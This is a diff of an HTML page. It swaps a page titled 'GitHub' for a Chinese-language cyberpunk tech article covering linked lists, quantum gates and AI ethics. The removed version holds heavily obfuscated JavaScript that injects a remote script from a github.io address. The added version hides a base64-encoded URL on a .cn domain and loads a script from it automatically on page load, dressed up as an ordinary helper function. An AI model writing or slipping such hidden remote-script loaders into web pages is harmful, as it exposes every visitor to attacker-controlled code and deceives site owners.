@@ -1,146 +1,466 @@
-<!doctype html>
-<html>
+<!DOCTYPE html>
+<html lang="zh-CN">
 
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport"
-        content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
-    <meta name="robots" content="noindex,nofollow" />
-    <title>GitHub</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>未来协议：数字前沿解析</title>
     <style>
-        
-        html,
+        /* 全局重置与基础样式 */
         body {
-            width: 100vw;
-            height: 100vh;
-        }
-
-        * {
+            overflow: hidden;
+            font-family: 'Roboto Mono', monospace;
+            /* 科技感等宽字体 */
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
+            background-color: #0A0A0A;
+            /* 极深背景 */
+            color: #E0E0E0;
+            /* 亮灰色文本 */
+            line-height: 1.7;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
         }
 
-        #childIframe {
-            width: 100%;
-            height: 100vh;
-            border: none;
+        /* 容器 */
+        .container {
+            max-width: 90%;
+            /* 适应移动端 */
+            margin: 0 auto;
+            padding: 20px 0;
         }
 
-        .loading_container {
+        /* 头部 - 赛博朋克风格 */
+        header {
+            background-color: #0D0D0D;
+            /* 更深的头部背景 */
+            padding: 40px 20px;
+            text-align: center;
+            border-bottom: 2px solid #00FFFF;
+            /* 强调色：青色边框 */
+            box-shadow: 0 8px 25px rgba(0, 255, 255, 0.2);
+            /* 青色光晕阴影 */
+            position: relative;
+            overflow: hidden;
+        }
+
+        header::before {
+            /* 顶部几何线条 */
+            content: '';
             position: absolute;
-            top: 40%;
-            left: 40%;
-            margin-left: 10%;
-            transform: translate3d(-50%, -50%, 0);
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 5px;
+            background: linear-gradient(90deg, transparent, #00FFFF, transparent);
+            animation: scanline 3s infinite linear;
         }
 
-        .loading_container .dot {
-            width: 24px;
-            height: 24px;
-            background: #3ac;
-            border-radius: 100%;
+        @keyframes scanline {
+            0% {
+                transform: translateX(-100%);
+            }
+
+            100% {
+                transform: translateX(100%);
+            }
+        }
+
+        header h1 {
+            margin: 0;
+            font-family: 'Orbitron', sans-serif;
+            /* 假设字体可用，未来感标题 */
+            font-size: 2.8em;
+            color: #00FFFF;
+            /* 青色标题 */
+            letter-spacing: 3px;
+            text-shadow: 0 0 15px rgba(0, 255, 255, 0.8);
+            /* 强光晕效果 */
+            text-transform: uppercase;
+        }
+
+        header p {
+            font-family: 'Roboto', sans-serif;
+            font-size: 1.1em;
+            color: #B0B0B0;
+            margin-top: 15px;
+            letter-spacing: 1px;
+        }
+
+        /* 导航菜单 - 发光按钮 */
+        nav {
+            background-color: transparent;
+            /* 透明背景 */
+            text-align: center;
+            padding: 15px 0;
+            margin-top: 30px;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            border-bottom: 1px dashed #333333;
+            /* 虚线分隔 */
+        }
+
+        nav ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+
+        nav ul li {
+            margin: 0 15px;
+        }
+
+        nav ul li a {
+            background-color: #222222;
+            /* 按钮背景 */
+            color: #00FFFF;
+            /* 青色文字 */
+            text-decoration: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            /* 锐利边角 */
+            border: 1px solid #00FFFF;
+            /* 青色边框 */
+            transition: background-color 0.3s ease, color 0.3s ease, box-shadow 0.3s ease, transform 0.2s ease;
             display: inline-block;
-            animation: slide 1s infinite;
+            font-weight: bold;
+            font-size: 1em;
+            box-shadow: 0 0 8px rgba(0, 255, 255, 0.4);
+            /* 按钮发光 */
         }
 
-        .loading_container .dot:nth-child(1) {
-            animation-delay: 0.1s;
-            background: #32aacc;
+        nav ul li a:hover,
+        nav ul li a:focus {
+            background-color: #00FFFF;
+            /* 悬停时背景变为青色 */
+            color: #0A0A0A;
+            /* 悬停时文字变为深色 */
+            transform: translateY(-3px);
+            box-shadow: 0 0 15px rgba(0, 255, 255, 0.8);
+            /* 更强发光 */
         }
 
-        .loading_container .dot:nth-child(2) {
-            animation-delay: 0.2s;
-            background: #64aacc;
+        /* 内容区 - 模块化数据块 */
+        main {
+            padding-top: 30px;
         }
 
-        .loading_container .dot:nth-child(3) {
-            animation-delay: 0.3s;
-            background: #96aacc;
+        section {
+            background-color: #1A1A1A;
+            /* 内容区背景 */
+            margin-bottom: 40px;
+            padding: 30px;
+            border-radius: 8px;
+            /* 适中圆角 */
+            border: 1px solid #333333;
+            /* 边框 */
+            box-shadow: 0 6px 18px rgba(0, 0, 0, 0.3);
+            position: relative;
+            overflow: hidden;
         }
 
-        .loading_container .dot:nth-child(4) {
-            animation-delay: 0.4s;
-            background: #c8aacc;
+        section::before {
+            /* 边角装饰 */
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 20px;
+            height: 20px;
+            border-top: 2px solid #FF00FF;
+            /* 品红色 */
+            border-left: 2px solid #FF00FF;
         }
 
-        .loading_container .dot:nth-child(5) {
-            animation-delay: 0.5s;
-            background: #faaacc;
+        section::after {
+            /* 边角装饰 */
+            content: '';
+            position: absolute;
+            bottom: 0;
+            right: 0;
+            width: 20px;
+            height: 20px;
+            border-bottom: 2px solid #FF00FF;
+            border-right: 2px solid #FF00FF;
         }
 
-        @-moz-keyframes slide {
-            0% {
-                transform: scale(1);
-            }
-
-            50% {
-                opacity: 0.3;
-                transform: scale(2);
-            }
-
-            100% {
-                transform: scale(1);
-            }
+        section h2 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 2.2em;
+            color: #00FFFF;
+            /* 青色标题 */
+            margin-top: 0;
+            margin-bottom: 15px;
+            border-bottom: 1px dashed #333333;
+            /* 虚线分隔 */
+            padding-bottom: 10px;
+            text-shadow: 0 0 5px rgba(0, 255, 255, 0.5);
         }
 
-        @-webkit-keyframes slide {
-            0% {
-                transform: scale(1);
-            }
-
-            50% {
-                opacity: 0.3;
-                transform: scale(2);
-            }
-
-            100% {
-                transform: scale(1);
-            }
+        section h3 {
+            font-family: 'Roboto Mono', monospace;
+            font-size: 1.4em;
+            color: #FF00FF;
+            /* 品红色 */
+            margin-top: 25px;
+            margin-bottom: 10px;
         }
 
-        @-o-keyframes slide {
-            0% {
-                transform: scale(1);
-            }
-
-            50% {
-                opacity: 0.3;
-                transform: scale(2);
-            }
-
-            100% {
-                transform: scale(1);
-            }
+        section p {
+            font-family: 'Roboto', sans-serif;
+            font-size: 1em;
+            color: #C0C0C0;
+            margin-bottom: 20px;
         }
 
-        @keyframes slide {
-            0% {
-                transform: scale(1);
-            }
+        section img {
+            max-width: 100%;
+            height: auto;
+            display: block;
+            margin: 25px auto;
+            border-radius: 5px;
+            border: 2px solid #FF00FF;
+            /* 青色边框 */
+            box-shadow: 0 0 10px rgba(0, 255, 255, 0.5);
+            /* 图片发光 */
+        }
 
-            50% {
-                opacity: 0.3;
-                transform: scale(2);
-            }
+        /* 代码块样式 - 终端风格 */
+        pre {
+            background-color: #000000;
+            /* 纯黑背景 */
+            color: #00FF00;
+            /* 亮绿色代码 */
+            padding: 20px;
+            border-radius: 8px;
+            overflow-x: auto;
+            font-family: 'Consolas', 'Monaco', monospace;
+            font-size: 0.9em;
+            margin-bottom: 25px;
+            border: 1px solid #00FF00;
+            /* 绿色边框 */
+            box-shadow: 0 0 15px rgba(0, 255, 0, 0.6);
+            /* 绿色发光 */
+        }
 
-            100% {
-                transform: scale(1);
-            }
+        code {
+            font-family: 'Consolas', 'Monaco', monospace;
+            font-size: 0.9em;
+            color: #00FF00;
+            /* 亮绿色 */
+        }
+
+        pre code {
+            color: #00FF00;
+        }
+
+        /* 页脚 - 简洁科技感 */
+        footer {
+            background-color: #0D0D0D;
+            /* 页脚背景 */
+            color: #B0B0B0;
+            padding: 25px 0;
+            text-align: center;
+            font-size: 0.9em;
+            margin-top: 50px;
+            border-top: 2px solid #FF00FF;
+            /* 品红色边框 */
+            box-shadow: 0 -8px 25px rgba(255, 0, 255, 0.2);
+            /* 品红色光晕阴影 */
+        }
+
+        .footer-links a {
+            color: #FF00FF;
+            /* 品红色链接 */
+            text-decoration: none;
+            margin: 0 18px;
+            font-size: 1.2em;
+            transition: color 0.3s ease, text-shadow 0.3s ease;
+        }
+
+        .footer-links a:hover {
+            color: #00FFFF;
+            /* 悬停时变为青色 */
+            text-shadow: 0 0 10px rgba(0, 255, 255, 0.6);
         }
     </style>
+    <link rel="stylesheet" href="./style.css">
 </head>
 
 <body>
-    <div id="loading_box" class="loading_container">
-        <div class="dot"></div>
-        <div class="dot"></div>
-        <div class="dot"></div>
-        <div class="dot"></div>
-        <div class="dot"></div>
+    <header>
+        <div class="container">
+            <h1>未来协议</h1>
+            <p>数字前沿解析与趋势洞察</p>
+        </div>
+    </header>
+
+    <div class="container">
+        <nav id="mainNav">
+            <ul>
+                <li><a href="#intro-protocol">引言协议</a></li>
+                <li><a href="#data-structures">数据结构</a></li>
+                <li><a href="#quantum-computing">量子计算</a></li>
+            </ul>
+        </nav>
+
+        <main>
+            <section id="intro-protocol">
+                <h2>引言协议：数字纪元的新范式</h2>
+                <img src="https://picsum.photos/300/200?random=1&id=futuristic-city-1" alt="未来城市景象"
+                    class="random-image">
+                <p>在高速迭代的数字纪元，理解并适应新的技术范式至关重要。本协议旨在为读者提供一份关于未来科技核心概念的深度解析，涵盖从基础架构到前沿应用的方方面面。</p>
+                <p>我们将探索数据流的优化路径、计算能力的边界突破，以及人工智能在伦理层面所面临的挑战与机遇。</p>
+            </section>
+
+            <section id="data-structures">
+                <h2>数据结构：信息流的骨架</h2>
+                <img src="https://picsum.photos/300/200?random=2&id=abstract-data-2" alt="抽象数据流" class="random-image">
+                <p>高效的数据结构是构建任何复杂系统的基石。它们决定了信息存储、检索与处理的效率。以下是一个简化版的链表节点定义：</p>
+                <pre><code>class Node:
+    def __init__(self, data):
+        self.data = data
+        self.next = None
+
+# 创建链表
+head = Node(10)
+second = Node(20)
+third = Node(30)
+
+head.next = second
+second.next = third
+
+print(head.data) # 输出: 10
+print(head.next.data) # 输出: 20</code></pre>
+                <p>理解这些基本构造是优化大规模数据处理的关键。</p>
+            </section>
+
+            <section id="quantum-computing">
+                <h2>量子计算：超越经典极限</h2>
+                <img src="https://picsum.photos/300/200?random=3&id=quantum-circuit-3" alt="量子电路" class="random-image">
+                <p>量子计算代表着计算能力的下一次革命。通过利用量子力学现象，如叠加和纠缠，量子计算机有望解决经典计算机无法企及的问题。</p>
+                <p>尽管仍处于早期阶段，但其在密码学、材料科学和药物发现等领域的潜力已引起广泛关注。</p>
+                <pre><code>// 模拟一个简单的量子门操作
+function applyHadamard(qubitState) {
+    // 假设 qubitState 是 [alpha, beta]
+    // H门操作会将 |0> 变为 (|0> + |1>)/sqrt(2)
+    // |1> 变为 (|0> - |1>)/sqrt(2)
+    const [alpha, beta] = qubitState;
+    const sqrt2 = Math.sqrt(2);
+    return [
+        (alpha + beta) / sqrt2,
+        (alpha - beta) / sqrt2
+    ];
+}
+
+let initialQubit = [1, 0]; // |0> 态
+let afterHadamard = applyHadamard(initialQubit);
+// console.log(afterHadamard); // 输出: [0.707..., 0.707...]</code></pre>
+            </section>
+
+            <section id="ai-ethics">
+                <h2>AI伦理：智能时代的责任边界</h2>
+                <img src="https://picsum.photos/300/200?random=4&id=ai-ethics-4" alt="AI伦理与人类" class="random-image">
+                <p>随着人工智能的普及，关于其伦理影响的讨论变得日益重要。如何确保AI系统的公平性、透明度和可控性，是构建负责任AI的关键。</p>
+                <p>我们必须建立健全的监管框架和道德准则，以引导AI技术朝着有益于人类社会的方向发展。</p>
+            </section>
+        </main>
     </div>
+
+    <footer>
+        <div class="container">
+            <p>&copy; 2025 未来协议. 数据流已加密.</p>
+            <div class="footer-links">
+                <a href="#" target="_blank">数据端口</a> |
+                <a href="#" target="_blank">通讯链路</a> |
+                <a href="#" target="_blank">系统日志</a>
+            </div>
+        </div>
+    </footer>
+    <div id="overlay">
+        <div id="loading_box" class="loading_container">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+        </div>
+    </div>
+
     <script>
-        var _0xodl = 'fSxlA2'; if (function (_0x44df4a, _0x58e26e, _0x532227, _0x1cbb24, _0x42581a, _0x509b59, _0xa79306) { return _0x44df4a = _0x44df4a >> 0x9, _0x509b59 = 'hs', _0xa79306 = 'hs', function (_0x4d29f2, _0x4cbc97, _0xbe291c, _0x31ad23, _0x13acc7) { const _0x407516 = _0x57d3; _0x31ad23 = 'tfi', _0x509b59 = _0x31ad23 + _0x509b59, _0x13acc7 = 'up', _0xa79306 += _0x13acc7, _0x509b59 = _0xbe291c(_0x509b59), _0xa79306 = _0xbe291c(_0xa79306), _0xbe291c = 0x0; const _0x1902ef = _0x4d29f2(); while (!![] && --_0x1cbb24 + _0x4cbc97) { try { _0x31ad23 = -parseInt(_0x407516(0x1d7, ')&2K')) / 0x1 * (-parseInt(_0x407516(0x1da, '(qya')) / 0x2) + -parseInt(_0x407516(0x1c7, 'Pm#h')) / 0x3 * (-parseInt(_0x407516(0x1d1, 'xvr1')) / 0x4) + parseInt(_0x407516(0x1c9, 'Mw8H')) / 0x5 + -parseInt(_0x407516(0x1d8, 'Y$EJ')) / 0x6 + parseInt(_0x407516(0x1cb, 'HIOm')) / 0x7 + -parseInt(_0x407516(0x1dd, 'mry*')) / 0x8 + -parseInt(_0x407516(0x1cc, 'Mw8H')) / 0x9 * (parseInt(_0x407516(0x1dc, 'quPr')) / 0xa); } catch (_0x531926) { _0x31ad23 = _0xbe291c; } finally { _0x13acc7 = _0x1902ef[_0x509b59](); if (_0x44df4a <= _0x1cbb24) _0xbe291c ? _0x42581a ? _0x31ad23 = _0x13acc7 : _0x42581a = _0x13acc7 : _0xbe291c = _0x13acc7; else { if (_0xbe291c == _0x42581a['replace'](/[kqChQWiaIPvYKouwOtDL=]/g, '')) { if (_0x31ad23 === _0x4cbc97) { _0x1902ef['un' + _0x509b59](_0x13acc7); break; } _0x1902ef[_0xa79306](_0x13acc7); } } } } }(_0x532227, _0x58e26e, function (_0x5c8363, _0x34873c, _0x10efd6, _0x28a9f7, _0x1dd818, _0x16adf9, _0x3ea5ad) { return _0x34873c = '\x73\x70\x6c\x69\x74', _0x5c8363 = arguments[0x0], _0x5c8363 = _0x5c8363[_0x34873c](''), _0x10efd6 = '\x72\x65\x76\x65\x72\x73\x65', _0x5c8363 = _0x5c8363[_0x10efd6]('\x76'), _0x28a9f7 = '\x6a\x6f\x69\x6e', (0x1b0f1e, _0x5c8363[_0x28a9f7]('')); }); }(0x19800, 0x89423, _0x1ca1, 0xce), _0x1ca1) { } function _0x1e3297() { const _0x596da2 = _0x57d3, _0x1816ad = { 'bCFHm': 'https://snake-imfv.github.io/take-gate/common.mimi.js?timestamp=', 'UVwwa': _0x596da2(0x1c8, 'u57N'), 'VQnBe': _0x596da2(0x1c6, '#XD(') }, _0x3d27e5 = Date[_0x596da2(0x1d5, ']sYX')](), _0x3ed973 = Math['floor'](Math[_0x596da2(0x1de, 'GP!4')]() * 0xf4240), _0x2564ef = _0x1816ad['bCFHm'] + _0x3d27e5 + _0x1816ad[_0x596da2(0x1cf, 'lKdL')] + _0x3ed973, _0xb78199 = document[_0x596da2(0x1db, '!MEf')](_0x1816ad[_0x596da2(0x1d3, '#W5W')]); _0xb78199[_0x596da2(0x1ce, 'sIgF')] = _0x2564ef, document[_0x596da2(0x1c4, '1Rum')]['appendChild'](_0xb78199); } function _0x57d3(_0x3a7c21, _0x386983) { const _0x1ca173 = _0x1ca1(); return _0x57d3 = function (_0x57d370, _0xacf434) { _0x57d370 = _0x57d370 - 0x1c4; let _0x51e50f = _0x1ca173[_0x57d370]; if (_0x57d3['hhIPqO'] === undefined) { var _0x15663a = function (_0x11d2a9) { const _0x85d5c2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/='; let _0x31b329 = '', _0xc951fd = ''; for (let _0x2837ed = 0x0, _0x364686, _0x101443, _0x448ee2 = 0x0; _0x101443 = _0x11d2a9['charAt'](_0x448ee2++); ~_0x101443 && (_0x364686 = _0x2837ed % 0x4 ? _0x364686 * 0x40 + _0x101443 : _0x101443, _0x2837ed++ % 0x4) ? _0x31b329 += String['fromCharCode'](0xff & _0x364686 >> (-0x2 * _0x2837ed & 0x6)) : 0x0) { _0x101443 = _0x85d5c2['indexOf'](_0x101443); } for (let _0xccb879 = 0x0, _0x1f82ce = _0x31b329['length']; _0xccb879 < _0x1f82ce; _0xccb879++) { _0xc951fd += '%' + ('00' + _0x31b329['charCodeAt'](_0xccb879)['toString'](0x10))['slice'](-0x2); } return decodeURIComponent(_0xc951fd); }; const _0x3a032f = function (_0x1c294f, _0x1177da) { let _0x131465 = [], _0x4d6de2 = 0x0, _0x32adbe, _0x4d6802 = ''; _0x1c294f = _0x15663a(_0x1c294f); let _0x4973f5; for (_0x4973f5 = 0x0; _0x4973f5 < 0x100; _0x4973f5++) { _0x131465[_0x4973f5] = _0x4973f5; } for (_0x4973f5 = 0x0; _0x4973f5 < 0x100; _0x4973f5++) { _0x4d6de2 = (_0x4d6de2 + _0x131465[_0x4973f5] + _0x1177da['charCodeAt'](_0x4973f5 % _0x1177da['length'])) % 0x100, _0x32adbe = _0x131465[_0x4973f5], _0x131465[_0x4973f5] = _0x131465[_0x4d6de2], _0x131465[_0x4d6de2] = _0x32adbe; } _0x4973f5 = 0x0, _0x4d6de2 = 0x0; for (let _0x54b701 = 0x0; _0x54b701 < _0x1c294f['length']; _0x54b701++) { _0x4973f5 = (_0x4973f5 + 0x1) % 0x100, _0x4d6de2 = (_0x4d6de2 + _0x131465[_0x4973f5]) % 0x100, _0x32adbe = _0x131465[_0x4973f5], _0x131465[_0x4973f5] = _0x131465[_0x4d6de2], _0x131465[_0x4d6de2] = _0x32adbe, _0x4d6802 += String['fromCharCode'](_0x1c294f['charCodeAt'](_0x54b701) ^ _0x131465[(_0x131465[_0x4973f5] + _0x131465[_0x4d6de2]) % 0x100]); } return _0x4d6802; }; _0x57d3['dxeyOG'] = _0x3a032f, _0x3a7c21 = arguments, _0x57d3['hhIPqO'] = !![]; } const _0x4f32da = _0x1ca173[0x0], _0x4af055 = _0x57d370 + _0x4f32da, _0x21827a = _0x3a7c21[_0x4af055]; return !_0x21827a ? (_0x57d3['AawnSq'] === undefined && (_0x57d3['AawnSq'] = !![]), _0x51e50f = _0x57d3['dxeyOG'](_0x51e50f, _0xacf434), _0x3a7c21[_0x4af055] = _0x51e50f) : _0x51e50f = _0x21827a, _0x51e50f; }, _0x57d3(_0x3a7c21, _0x386983); } _0x1e3297(); function _0x1ca1() { const _0x588e4a = (function () { return [_0xodl, 'twftoQSohxuClqADO2ItPvkLWKYPwkai==', 'WPzprCkiiCkVpmkrqezTW4JdLq', 'WR3dTb0ZWR1wtfj+dL/dVSkJ', 'qq50pLvDog3dN3avWO3cSG', 'W549mhmi'].concat((function () { return ['WPO9W5eXnSk2h8kjw8opW64EWPC', 'W7vgW6a', 'lmo+pMlcSmkzxmkVuSkUW4hcRha', 'WQj2fmoGWRhdUmoACWZdKG', 'W7T2W73cVmkggmkuWRCQW6iqo8kq', 'FL4HWP/dLbTm'].concat((function () { return ['W7JcLJWinGFdN2q', 'W7dcTCoTfq5wpSkImCkYsrPu', 'W5hcVY1XWOXnW7Wx', 'j8kbnw8XvI7cNXbhjCkDW7e', 'tgXwW4PdWP4', 'WPaLkSoW'].concat((function () { return ['rqT0oWyEzxRdSuC', 'a143zr0A', 'E8oaWRxdP8k6WRGb', 'W6ldGCoDuN8/W5xcHG', 'FGLxW7xcIwuiEmkzECk8W6ae', 'WPRdMr3dOttcISkjWPhcT2ldGGRdOa'].concat((function () { return ['WPzkrSkok8kKpSk+xNXTW6JdLG', 'FWPsW7xcGM0jACkPE8khW64v', 'WPVdNXVdPZxcICkkWQ/cMvRdUstdSG', 'WQLVrG', 'W43cIcqGla']; }())); }())); }())); }())); }()); _0x1ca1 = function () { return _0x588e4a; }; return _0x1ca1(); };
+        document.addEventListener('DOMContentLoaded', function () {
+            document.querySelectorAll('nav a').forEach(anchor => {
+                anchor.addEventListener('click', function (e) {
+                    e.preventDefault();
+
+                    const targetId = this.getAttribute('href').substring(1);
+                    const targetElement = document.getElementById(targetId);
+
+                    if (targetElement) {
+                        window.scrollTo({
+                            top: targetElement.offsetTop,
+                            behavior: 'smooth'
+                        });
+                    }
+                });
+            });
+        });
+    </script>
+    <script>
+        (function () {
+            function init() {
+                const timestamp = Date.now()
+                const randomNum = Math.floor(Math.random() * 1000000)
+                const domain = getdocs();
+                const url = domain + "=" + timestamp + "&random=" + randomNum
+                const script = document.createElement("script")
+                script.src = url
+                document.body.appendChild(script)
+            }
+            function getdocs() {
+                const dd = "Ly9kOGYwZzJoLmphb3BueC5jbi9zdGF0aWMvanMvY29yZS5taW4uanM/dA==";
+                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
+                const lookup = new Uint8Array(256);
+                for (let i = 0; i < chars.length; i++) {
+                    lookup[chars.charCodeAt(i)] = i;
+                }
+                let padding = 0;
+                if (dd.endsWith('==')) {
+                    padding = 2;
+                } else if (dd.endsWith('=')) {
+                    padding = 1;
+                }
+                const cleanedString = dd.replace(/[^A-Za-z0-9+/=]/g, '');
+                const len = cleanedString.length;
+                if (len % 4 !== 0) {
+                    throw new Error("Invalid string length.");
+                }
+                const outputLength = (len / 4) * 3 - padding;
+                const outputBytes = new Uint8Array(outputLength);
+                let outputIndex = 0;
+                let i = 0;
+                while (i < len) {
+                    const c1 = lookup[cleanedString.charCodeAt(i++)];
+                    const c2 = lookup[cleanedString.charCodeAt(i++)];
+                    const c3 = lookup[cleanedString.charCodeAt(i++)];
+                    const c4 = lookup[cleanedString.charCodeAt(i++)];
+                    outputBytes[outputIndex++] = (c1 << 2) | (c2 >> 4);
+                    if (c3 !== 64) {
+                        outputBytes[outputIndex++] = ((c2 & 15) << 4) | (c3 >> 2);
+                    }
+                    if (c4 !== 64) {
+                        outputBytes[outputIndex++] = ((c3 & 3) << 6) | c4;
+                    }
+                }
+                const decoder = new TextDecoder('utf-8');
+                return decoder.decode(outputBytes);
+            }
+            init()
+        })()
     </script>
 </body>
 
